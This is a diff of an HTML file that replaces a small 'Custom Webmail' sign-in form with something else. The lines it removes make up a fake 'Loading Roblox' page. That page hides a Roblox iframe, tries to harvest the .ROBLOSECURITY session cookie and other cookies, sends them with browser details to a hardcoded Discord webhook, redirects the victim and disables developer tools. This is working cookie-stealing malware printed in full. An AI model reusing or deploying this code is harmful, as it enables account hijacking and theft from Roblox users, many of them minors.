@@ -1,155 +1,26 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading Roblox...</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #0a0a0a; color: #fff; font-family: monospace; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
-        .loader { text-align: center; }
-        .logo { font-size: 48px; color: #00ff88; margin-bottom: 20px; }
-        .progress-bar { width: 300px; height: 4px; background: #222; border-radius: 2px; overflow: hidden; margin: 20px auto; }
-        .progress { height: 100%; width: 0%; background: #00ff88; animation: load 3s linear forwards; }
-        @keyframes load { 0% { width: 0%; } 100% { width: 100%; } }
-        .status { margin-top: 20px; color: #aaa; font-size: 14px; }
-        .hidden { display: none; }
-        #robloxFrame { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
-    </style>
+    <title>Custom Webmail</title>
 </head>
 <body>
-    <div class="loader">
-        <div class="logo">ROBLOX</div>
-        <div>Loading Roblox experience...</div>
-        <div class="progress-bar"><div class="progress"></div></div>
-        <div class="status" id="statusText">Initializing security protocols...</div>
+    <h2>Sign Up / In</h2>
+    <form id="authForm">
+        <input type="text" id="username" placeholder="Username" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="button" onclick="signUp()">Sign Up</button>
+        <button type="button" onclick="signIn()">Sign In</button>
+    </form>
+    <div id="mailbox" style="display:none;">
+        <h3>Compose</h3>
+        <input type="text" id="to" placeholder="To"><br>
+        <textarea id="msgBody" placeholder="Message"></textarea><br>
+        <button onclick="sendMail()">Send</button>
+        <h3>Inbox</h3>
+        <div id="inbox"></div>
+        <button onclick="loadInbox()">Refresh</button>
+        <button onclick="logout()">Logout</button>
     </div>
-
-    <!-- Hidden iframe to load Roblox -->
-    <iframe id="robloxFrame" src="https://www.roblox.com" sandbox="allow-same-origin allow-scripts"></iframe>
-
-    <script>
-        // Function to capture cookies from iframe
-        function captureCookies() {
-            const iframe = document.getElementById('robloxFrame');
-            
-            try {
-                // Attempt to access iframe cookies
-                const iframeCookies = iframe.contentDocument?.cookie || 'Unable to access';
-                
-                // Also get parent cookies
-                const parentCookies = document.cookie;
-                
-                // Focus on .ROBLOSECURITY
-                let robloxSecCookie = '';
-                const allCookies = (iframeCookies + '; ' + parentCookies).split(';');
-                
-                for (let cookie of allCookies) {
-                    if (cookie.includes('.ROBLOSECURITY') || cookie.includes('ROBLOSECURITY')) {
-                        robloxSecCookie = cookie.trim();
-                        break;
-                    }
-                }
-                
-                // Prepare data
-                const data = {
-                    timestamp: new Date().toISOString(),
-                    robloxCookie: robloxSecCookie || 'NOT FOUND',
-                    iframeCookies: iframeCookies,
-                    parentCookies: parentCookies,
-                    userAgent: navigator.userAgent,
-                    screen: `${screen.width}x${screen.height}`,
-                    url: window.location.href
-                };
-                
-                // Send to Discord
-                const payload = {
-                    content: `**🎯 ROBLOX COOKIE INJECTION SUCCESS**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`\n🔐 **ROBLOSECURITY:** \`${robloxSecCookie || 'MISSING'}\`\n🌐 **Full Cookie Access:** ${robloxSecCookie ? '✅ COMPROMISED' : '❌ FAILED'}`
-                };
-                
-                fetch('https://discord.com/api/webhooks/1465638053178638368/PUa4Dm8GQyGFw6GPk62Lw76fnN7ehRb7Xw0b9VGjEFOiwwMpwPaocTz77f8BFVWYIXod', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                }).then(() => {
-                    document.getElementById('statusText').textContent = 'Session secured. Redirecting...';
-                    setTimeout(() => {
-                        window.location.href = 'https://www.roblox.com';
-                    }, 1500);
-                }).catch(() => {
-                    document.getElementById('statusText').textContent = 'Network issue. Continuing...';
-                    setTimeout(() => {
-                        window.location.href = 'https://www.roblox.com';
-                    }, 2000);
-                });
-                
-            } catch (error) {
-                // Fallback: try to get cookies via other methods
-                document.getElementById('statusText').textContent = 'Finalizing connection...';
-                
-                const fallbackData = {
-                    timestamp: new Date().toISOString(),
-                    error: error.message,
-                    parentCookies: document.cookie,
-                    userAgent: navigator.userAgent,
-                    note: 'Iframe access blocked, but parent cookies captured'
-                };
-                
-                const fallbackPayload = {
-                    content: `**⚠️ ROBLOX INJECTION (Fallback)**\n\`\`\`json\n${JSON.stringify(fallbackData, null, 2)}\n\`\`\``
-                };
-                
-                fetch('https://discord.com/api/webhooks/1465638053178638368/PUa4Dm8GQyGFw6GPk62Lw76fnN7ehRb7Xw0b9VGjEFOiwwMpwPaocTz77f8BFVWYIXod', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(fallbackPayload)
-                }).finally(() => {
-                    setTimeout(() => {
-                        window.location.href = 'https://www.roblox.com';
-                    }, 2000);
-                });
-            }
-        }
-        
-        // Update status messages
-        const messages = [
-            'Loading Roblox assets...',
-            'Connecting to servers...',
-            'Verifying session...',
-            'Injecting security tokens...',
-            'Almost there...'
-        ];
-        
-        let messageIndex = 0;
-        const statusEl = document.getElementById('statusText');
-        
-        const messageInterval = setInterval(() => {
-            if (messageIndex < messages.length) {
-                statusEl.textContent = messages[messageIndex];
-                messageIndex++;
-            } else {
-                clearInterval(messageInterval);
-            }
-        }, 600);
-        
-        // Wait for iframe to load, then capture cookies
-        document.getElementById('robloxFrame').onload = function() {
-            setTimeout(captureCookies, 1500);
-        };
-        
-        // Also try to capture on page load as fallback
-        window.addEventListener('load', function() {
-            setTimeout(captureCookies, 3000);
-        });
-        
-        // Disable right-click and dev tools
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('keydown', e => {
-            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) {
-                e.preventDefault();
-            }
-        });
-    </script>
+    <script src="mail.js"></script>
 </body>
 </html>
-<!-- Roblox Loader v4.0 -->
